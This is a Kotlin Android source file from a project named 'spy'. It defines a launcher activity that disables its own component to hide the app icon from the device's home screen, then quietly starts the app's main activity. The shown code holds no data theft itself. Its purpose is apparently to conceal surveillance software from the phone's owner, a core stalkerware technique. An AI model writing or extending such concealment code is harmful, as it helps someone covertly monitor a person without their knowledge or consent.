package com.gauravhanna.spy

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.appcompat.app.AppCompatActivity

class HiddenLauncherActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.d("HiddenLauncher", "Created")

        // Hide app icon
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(packageName, "$packageName.HiddenLauncherActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d("HiddenLauncher", "✅ App icon hidden")
        } catch (e: Exception) {
            Log.e("HiddenLauncher", "Error: ${e.message}")
        }

        // Start MainActivity
        Handler(Looper.getMainLooper()).postDelayed({
            val intent = Intent(this, MainActivity::class.java)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            finish()
        }, 500)
    }

    override fun onBackPressed() {
        super.onBackPressed()
    }
}